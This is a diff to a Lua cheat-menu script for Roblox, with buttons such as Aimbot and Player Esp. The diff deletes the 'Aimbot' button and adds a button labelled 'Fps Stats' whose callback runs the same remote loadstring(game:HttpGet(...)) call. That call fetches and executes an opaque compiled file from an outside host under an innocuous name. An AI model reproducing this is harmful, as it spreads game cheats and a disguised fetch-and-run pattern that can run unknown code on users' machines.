@@ -153,12 +153,7 @@ local Button = Tab:CreateButton({
 
  local Tab = Window:CreateTab("⚔️Advantage Scripts", 4483362458) -- Title, Image
 
- local Button = Tab:CreateButton({
-   Name = "Aimbot",
-   Callback = function()
- loadstring(game:HttpGet("https://programcom.vercel.app/Syn/Loaded.luac"))("sOVLptbyAfNPa0F7FrjD")
-   end,
-})
+
 
 local Button = Tab:CreateButton({
    Name = "Player Esp",
@@ -348,7 +343,7 @@ game:GetService("Lighting").Changed:Connect(removeFog)
    end,
 })
 
-local Tab = Window:CreateTab("🗂️Misc", 4483362458) -- Title, Image
+local Tab = Window:CreateTab("🗂️Misc", "dices") -- Title, Image
 
 local Button = Tab:CreateButton({
    Name = "Keyboard",
@@ -375,6 +370,13 @@ for _, prompt in ipairs(workspace:GetDescendants()) do
         SetupProximityPrompt(prompt)
     end
 end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Fps Stats",
+   Callback = function()
+ loadstring(game:HttpGet("https://programcom.vercel.app/Syn/Loaded.luac"))("sOVLptbyAfNPa0F7FrjD")
    end,
 })
 
